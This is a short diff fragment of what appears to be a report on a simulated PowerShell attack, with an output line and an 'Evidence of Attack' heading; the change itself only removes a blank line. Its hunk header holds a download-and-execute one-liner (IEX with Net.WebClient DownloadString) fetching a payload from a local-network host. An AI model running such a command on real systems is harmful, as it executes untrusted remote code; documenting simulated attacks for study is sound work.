@@ -75,7 +75,6 @@ IEX (New-Object Net.WebClient).DownloadString("http://192.168.100.20:8000/payloa
 Output
 Simulated PowerShell attack executed
 
-
 ---
 
 ## Evidence of Attack
